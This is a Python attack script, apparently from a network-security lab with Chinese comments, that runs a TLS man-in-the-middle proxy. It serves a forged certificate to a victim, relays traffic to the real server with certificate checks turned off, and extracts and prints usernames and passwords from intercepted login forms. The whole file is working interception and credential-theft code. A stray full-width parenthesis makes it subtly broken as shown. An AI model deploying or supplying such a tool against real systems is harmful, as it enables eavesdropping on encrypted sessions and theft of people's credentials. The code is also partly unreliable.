#!/usr/bin/env python3

import socket
import ssl
import threading
import sys
from urllib.parse import parse_qs, urlparse

def create_fake_tls_connection(client):
    
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile="../certificates/host.crt", keyfile="../certificates/host.key") 
    ssl_sock = context.wrap_socket(client, server_side=True)
    
    return ssl_sock
）
def create_real_tls_connection(server_ip, server_port):
    # 創建 TCP 連線
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((server_ip, server_port))
    
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    ssl_sock = context.wrap_socket(sock, server_hostname=server_ip)
    
    return ssl_sock

def forward_data(src, dst):
    buffer = b""
    try:
        while True:
            data = src.recv(4096)
            if not data:
                break
            buffer += data
            if b"\r\n\r\n" in buffer:
                headers, body = buffer.split(b"\r\n\r\n", 1)
                content_length = 0
                for header in headers.split(b"\r\n"):
                    if b"Content-Length: " in header:
                        content_length = int(header.split(b": ")[1])
                        break
                if len(body) >= content_length:
                    if b"POST" in headers:
                        #print("[+] 偷到資料:", buffer.decode(errors="ignore"))
                        # 嘗試解析表單數據
                        try:
                            content_type = None
                            for header in headers.split(b"\r\n"):
                                if b"Content-Type: " in header:
                                    content_type = header.split(b": ")[1]
                                    break
                            #print("[+] Content-Type:", content_type)
                            if content_type == b"application/x-www-form-urlencoded":
                                form_data = parse_qs(body.decode())
                                if "id" in form_data and "pwd" in form_data:
                                    print("[+] id:", form_data["id"][0],"password:", form_data["pwd"][0])
                        except:
                            pass
                    buffer = b""
            dst.send(data)
    except:
        pass
    finally:
        try:
            src.close()
        except:
            pass
        try:
            dst.close()
        except:
            pass

def mitm_proxy(client):
    try:
        # 建立與受害者的 TLS 連線
        tls_client = create_fake_tls_connection(client)
        
        # 接收來自受害者的請求，提取目標伺服器的主機名
        data = tls_client.recv(4096)
        target_host, target_port = extract_target(data)
        if not target_host:
            return

        # 解析目標伺服器的 IP 地址
        try:
            server_ip = socket.gethostbyname(target_host)
        except:
            return

        print(f"[+] Target: {target_host} ({server_ip}):{target_port}")

        # 建立與伺服器的 TLS 連線
        tls_server = create_real_tls_connection(server_ip, target_port)
        
        # 將初始請求轉發給伺服器
        tls_server.send(data)

        # 創建兩條線程來轉發數據
        threading.Thread(target=forward_data, args=(tls_client, tls_server)).start()
        threading.Thread(target=forward_data, args=(tls_server, tls_client)).start()
    except:
        pass
    finally:
        try:
            client.close()
        except:
            pass

# 解析目標伺服器的主機名
def extract_target(data):
    try:
        headers = data.decode().split('\r\n')
        for header in headers:
            if header.startswith('Host:'):
                host = header.split(' ')[1]
                if ':' in host:
                    target_host, target_port = host.split(':')
                    target_port = int(target_port)
                else:
                    target_host = host
                    target_port = 443  
                return target_host, target_port
    except:
        pass
    return None, None

def start_proxy(host, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    #print(f"[+] Listening on {host}:{port}")

    while True:
        client, addr = server.accept()
        #print(f"[+] Accepted connection from {addr}")
        threading.Thread(target=mitm_proxy, args=(client,)).start()

# 主要程式
if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: sudo ./attack.py <victim ip> [<interface>]")
        sys.exit(1)

    victim_ip = sys.argv[1]
    interface = sys.argv[2] if len(sys.argv) > 2 else None
    
    proxy_port = 8080 
    
    start_proxy("0.0.0.0", proxy_port)